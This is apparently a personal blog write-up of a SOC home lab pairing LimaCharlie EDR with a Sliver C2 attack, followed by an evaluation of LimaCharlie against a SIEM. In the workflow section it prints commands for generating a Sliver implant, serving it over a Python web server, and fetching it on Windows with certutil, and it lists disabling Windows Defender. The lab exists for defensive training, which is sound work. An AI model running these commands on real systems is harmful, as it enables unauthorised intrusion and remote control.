

  <h1>SOC Attack and Detection with Lima Charlie, Sigma, & Sliver</h1>

  <h2>Introduction</h2>
  <p>Recently, to optimize telemetry storage costs for my organization, I began researching alternatives to traditional SIEMs, which led me to look into Lima Charlie. Lima Charlie is a solution that offers endpoint detection and response but with free storage for up to one year's worth of data. 
</p>
<p>To evaluate my understanding of Lima Charlie, I followed the SOC Analyst home lab instructions from Eric Capuano's blog series, which can be found here. Eric's blog series was easy to follow and taught many hands-on practical cybersecurity skills used in the field.
</p>

  <h2>Skills Covered</h2>
  <ul>
    <li>Simulate cybersecurity attack and defense roles</li>
    <li>Set up a virtualized environment in VMware Workstation with Windows and Linux</li>
    <li>Disabling Windows Defender via registry and system settings</li>
    <li>Utilize Command Prompt, PowerShell, and Linux Terminal</li>
    <li>Remote accessing VMs using SSH</li>
    <li>Establish a C2 server with Sliver, deploying a payload on the victim machine</li>
    <li>Analyze telemetry and EDR with Sysmon and LimaCharlie for detection and defense against Sliver</li>
    <li>Detection & Response rule creation</li>
    <li>Sigma rule creation and implementation</li>
  </ul>


  <h2>Project Workflow</h2>
  <p>Below is a summary of my steps with this SOC Analyst lab. Much of it mirrors Eric's blog series and incorporates any issues I encountered. If you want a complete step-by-step tutorial, follow along with the original blog. </p>
  <ol>
    <li><strong>Environment Setup</strong>
      <ul>
        <li>I set up a SOC environment utilizing Linux Ubuntu Server as the attack machine as it is lighter weight than Kali to conserve resources and for practice using Terminal. A static IP was implemented for simplicity's sake and to ensure the SOC environments function in the future.  A test for functionality with the static IP can be seen below:</li>
        <li>Commands:
          <pre>
            sliver-server # starting the server
            generate --http [Linux_VM_IP] --save /opt/sliver # generating C2 session payload
          </pre>
        </li>
      </ul>
    </li>
    
  <li><strong>Transferring Payload and Executing on Windows</strong>
      <ul>
        <li>Setting up a Python server on Linux for payload transfer.</li>
        <li>Using PowerShell on Windows to download and execute the payload.</li>
        <li>Commands:
          <pre>
            python3 -m http.server 80 # start Python server
            certutil.exe -f -urlcache http://[Linux_VM_IP]/GERMAN_HEADLINE.exe german_headline.exe # transfer payload
          </pre>
        </li>
      </ul>
    </li>

  <li><strong>Upon closing the python server in the linux machine, we will now start the sliver-server to receive the call back.</strong>
      <ul>
        <li>Starting the server</li>
        <li>Setting up listener</li>
        <li>Commands:
          <pre>
            sliver-server 
            http
          </pre>
        </li>
      </ul>
    </li>

  <li><strong>Now time to go into Lima Charlie to see the noise!</strong>
      <ul>
        <li>Going into the sensors tab, I can see that my windows machine is online</li>
        <li>Viewing your sensor that was installed, I liked that you could isolate the device from the network at the click of a button. Containing the problem at such ease is great for response and which is a process I’m sure could be automated within Lima Charlie.</li>
        <li>You’ll also be able to see things like the private / public IP, mac address, etc</li>
        <li>You can also view the entire file system, the device network, and basically everything about the device while the Lima Charlie sensor is installed on the device that you want to monitor.</li>
      </ul>
    </li>

  <li><strong>Going into timeline we can see plenty of noise that’s happening on the system. Tracking our c2 instance, we can find the exact time that we downloaded and executed it</strong>
      <ul>
        <li>time it was downloaded then executed moments later when looking through logs</li>
        <li>One event was also labeled as SENSITIVE_PROCESS_ACCESS very close to the event of a network connection with the c2 server. This could be because of the enumeration of privileges we were doing and when running commands through sliver.</li>
      </ul>
    </li>

  <li><strong>All in all, there’s many different way to see and track down what is happening. Given we had the IP that the process was connecting to, we could have also filtered our search results with the malicious IP that we’re using to emulate an attacker.</strong>
      <ul>
        <li>Given there’s plenty of noise that happens in the background of a windows machine, it’s probably a good idea to get familiar with the native processes within windows in order to have a better understanding of what’s normal and what isn’t. This is some of the advice given in the blog post referenced at the very beginning of this post.</li>
        <li>If I had to give any constructive criticism, I’d say that filtering through all the events is a bit too much. I am used to working with a SIEM that allows you to filter for commands ran and having the option to only view events where a command ran exists.</li>
        <li>For example, when filtering for sensitive process access events, I had to scroll quite a bit in order to see that it was involved with our c2 instance.</li>
        <li>The scroll bar on the bottom shows I scrolled about halfway through. Given all the JSON formatted objects, it’s quite a bit to scroll through.</li>
        <li>But Lima Charlie is new to me so maybe after some tinkering, I’ll get used to it and learn all the tricks.</li>
      </ul>
    </li>
  </ol>

  <h2>Recommendations and Conclusion</h2>
  <p>This lab was well-designed and comprehensive. I highly recommend it. After completing the lab, I can confirm that Lima Charlie is a powerful tool, thanks to its extensive EDR functionality and long-term storage that is free of cost. </p>

  <p>After the lab, Lima Charlie would be a great solution to reduce telemetry overhead for my organization. However, it is essential to note that Lima Charlie is an EDR solution and not as powerful as traditional SIEMs. Therefore, implementing a hybrid solution combining Splunk and Lima Charlie would be the best approach. This approach would allow us to use Splunk for initial monitoring and utilize Lima Charlie for longer-term telemetry - giving us the best of both worlds. </p>

  <hr>

